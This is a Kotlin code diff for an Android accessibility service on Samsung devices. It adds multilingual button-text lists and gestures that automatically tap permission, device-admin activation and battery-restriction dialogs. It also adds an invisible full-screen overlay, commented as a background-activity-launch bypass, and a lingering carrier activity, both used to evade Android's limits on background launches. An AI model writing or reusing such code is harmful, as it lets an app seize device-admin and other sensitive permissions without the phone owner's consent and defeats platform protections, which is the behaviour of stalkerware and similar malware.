@@ -24,25 +24,78 @@ object SamsungNavigator {
 
     private const val TAG = "Samsung"
 
-    // ── 文案表（OneUI 中文 / 英文都覆盖）
+    // ── 文案表（多语言：中 / 英 / 西 / 葡，覆盖 OneUI 常见地区）
+    //    原则：同一个语义把所有语言的写法都列进去，命中哪种用哪种，不依赖系统语言。
     val allowTexts = listOf(
-        "允许", "始终允许", "仅在使用该应用时允许", "允许所有", "确定", "知道了",
-        "Allow", "Allow all the time", "While using the app", "OK"
+        "允许", "始终允许", "使用应用时", "仅在使用该应用时允许", "允许所有", "确定", "知道了",
+        "Allow", "Allow all the time", "While using the app", "OK", "Got it",
+        "Permitir", "Permitir todo el tiempo", "Mientras se usa la app", "Aceptar",
+        "Permitir", "Permitir todo o tempo", "Ao usar o app", "OK"
     )
+    val denyTexts = listOf("不允许", "拒绝", "Deny", "Don't allow", "Denegar", "Recusar")
+    val cancelTexts = listOf("取消", "Cancel", "Cancelar")
     val adminActivateTexts = listOf(
-        "激活", "激活此设备管理应用", "启用", "启用此设备管理应用", "确定",
-        "Activate", "Activate this device admin app", "OK"
+        "启动", "激活", "激活此管理应用程序", "激活此设备管理应用", "启用", "确定",
+        "Activate", "Turn on", "OK",
+        "Activar", "Aceptar", "Ativar", "OK"
     )
-    val switchOnTexts = listOf("允许", "开启", "打开", "On", "Allow")
-    val unrestrictedTexts = listOf("不受限制", "不限制", "无限制", "允许后台活动", "Unrestricted", "Don't optimize")
+    val switchOnTexts = listOf("允许", "开启", "打开", "On", "Allow", "Permitir", "Ativar")
+    val unrestrictedTexts = listOf(
+        "不受限制", "不限制", "无限制", "允许后台活动", "不优化",
+        "Unrestricted", "Don't optimize", "Not optimized", "Allow background activity",
+        "Sin restricciones", "No optimizar", "Permitir actividad en segundo plano",
+        "Sem restrições", "Não otimizar"
+    )
 
-    /** 前台载体：把要跳的 Intent 交给它发起，1.2 秒后自己关掉 */
-    fun launch(service: BoundaryAccessibilityService, intent: Intent) {
+    // ── BAL 绕过：先挂一个不可见的全屏窗口（无障碍 2032，免权限），
+    //    系统认为本应用"有可见窗口"，后台启动 Activity 才会被放行。
+    private var balOverlay: android.view.View? = null
+
+    private fun ensureVisibleWindow(service: BoundaryAccessibilityService) {
+        if (balOverlay != null) return
         runCatching {
+            val wm = service.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
+            val v = android.view.View(service).apply { setBackgroundColor(0x01000000) }
+            val lp = android.view.WindowManager.LayoutParams(
+                android.view.WindowManager.LayoutParams.MATCH_PARENT,
+                android.view.WindowManager.LayoutParams.MATCH_PARENT,
+                2032,
+                android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                    android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                    android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                android.graphics.PixelFormat.TRANSLUCENT
+            )
+            wm.addView(v, lp)
+            balOverlay = v
+            Log.d(TAG, "bal overlay added")
+            Handler(Looper.getMainLooper()).postDelayed({ dropVisibleWindow(service) }, 6_000L)
+        }.onFailure { Log.w(TAG, "bal overlay failed: $it") }
+    }
+
+    private fun dropVisibleWindow(service: BoundaryAccessibilityService) {
+        val v = balOverlay ?: return
+        balOverlay = null
+        runCatching {
+            val wm = service.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
+            wm.removeView(v)
+        }
+    }
+
+    fun launch(service: BoundaryAccessibilityService, intent: Intent) {
+        ensureVisibleWindow(service)
+        val host = SamsungCarrierActivity.host
+        if (host != null) {
+            runCatching { host.startActivity(intent) }
+                .onSuccess { Log.d(TAG, "launch via host: ${intent.action ?: intent.component}") }
+                .onFailure { Log.w(TAG, "host launch failed: $it") }
+            return
+        }
+        runCatching {
+            SamsungCarrierActivity.pending = intent
             val i = Intent(service, SamsungCarrierActivity::class.java)
-                .putExtra(SamsungCarrierActivity.EXTRA_TARGET, intent)
                 .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             service.startActivity(i)
+            Log.d(TAG, "carrier start requested")
         }.onFailure { Log.w(TAG, "launch failed: $it") }
     }
 
@@ -106,6 +159,27 @@ object SamsungNavigator {
         return out
     }
 
+    /** 按资源 id 点（比文案稳，三星按钮文案随系统版本变） */
+    fun clickById(service: BoundaryAccessibilityService, idSuffix: String): String? {
+        for (root in roots(service)) {
+            val pool = ArrayList<AccessibilityNodeInfo>()
+            collectById(root, idSuffix, 0, pool)
+            for (n in pool) {
+                if (n.isEnabled && (n.performAction(AccessibilityNodeInfo.ACTION_CLICK) || tap(service, n))) {
+                    Log.d(TAG, "click id=$idSuffix")
+                    return idSuffix
+                }
+            }
+        }
+        return null
+    }
+
+    private fun collectById(n: AccessibilityNodeInfo?, id: String, d: Int, out: MutableList<AccessibilityNodeInfo>) {
+        if (n == null || d > 30 || out.size > 4) return
+        if (n.viewIdResourceName.orEmpty().endsWith(id)) out.add(n)
+        for (i in 0 until n.childCount) collectById(n.getChild(i), id, d + 1, out)
+    }
+
     fun clickText(service: BoundaryAccessibilityService, texts: List<String>): String? {
         for (root in roots(service)) {
             for (t in texts) {
@@ -130,6 +204,28 @@ object SamsungNavigator {
         true
     }.getOrDefault(false)
 
+    fun tapAt(service: BoundaryAccessibilityService, x: Int, y: Int): Boolean = runCatching {
+        val path = android.graphics.Path().apply { moveTo(x.toFloat(), y.toFloat()) }
+        val g = android.accessibilityservice.GestureDescription.Builder()
+            .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 60))
+            .build()
+        service.dispatchGesture(g, null, null)
+        true
+    }.getOrDefault(false)
+
+    /** 列表向上滑（内容上移） */
+    fun swipeUp(service: BoundaryAccessibilityService): Boolean = runCatching {
+        val path = android.graphics.Path().apply {
+            moveTo(540f, 1800f)
+            lineTo(540f, 900f)
+        }
+        val g = android.accessibilityservice.GestureDescription.Builder()
+            .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 320))
+            .build()
+        service.dispatchGesture(g, null, null)
+        true
+    }.getOrDefault(false)
+
     fun findText(n: AccessibilityNodeInfo?, want: String, d: Int): AccessibilityNodeInfo? {
         if (n == null || d > 40) return null
         val t = n.text?.toString().orEmpty()
@@ -146,20 +242,47 @@ object SamsungNavigator {
     }
 }
 
-/** 前台载体：唯一职责是"代替后台服务跳一次系统页面" */
+/**
+ * 前台载体：
+ *   ① 常驻 25 秒，期间 Android 认为本应用有可见窗口，系统页可以从这里跳；
+ *   ② 服务把要跳的 Intent 放在 [pending]，载体起来后立刻转发；
+ *   ③ 载体已经存在时，服务直接用 host.startActivity() 复用，不再重复起载体。
+ */
 class SamsungCarrierActivity : Activity() {
 
-    @Suppress("DEPRECATION")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        host = this
+        Log.d("SamsungCarrier", "onCreate")
+        consume()
+        Handler(Looper.getMainLooper()).postDelayed({ if (host === this) { host = null; finish() } }, 25_000L)
+    }
+
+    override fun onNewIntent(intent: Intent?) {
+        super.onNewIntent(intent)
+        consume()
+    }
+
+    private fun consume() {
+        val t = pending ?: return
+        pending = null
         runCatching {
-            val target = intent?.getParcelableExtra<Intent>(EXTRA_TARGET)
-            if (target != null) startActivity(target)
+            @Suppress("DEPRECATION")
+            val target = t.getParcelableExtra(EXTRA_TARGET) as? Intent
+            Log.d("SamsungCarrier", "target=${target?.action ?: target?.component ?: "null"}")
+            if (target != null) { startActivity(target); Log.d("SamsungCarrier", "startActivity ok") }
         }.onFailure { Log.w("SamsungCarrier", "start failed: $it") }
-        Handler(Looper.getMainLooper()).postDelayed({ finish() }, 1_200L)
+    }
+
+    override fun onDestroy() {
+        if (host === this) host = null
+        super.onDestroy()
     }
 
     companion object {
         const val EXTRA_TARGET = "target_intent"
+
+        @Volatile var host: SamsungCarrierActivity? = null
+        @Volatile var pending: Intent? = null
     }
 }
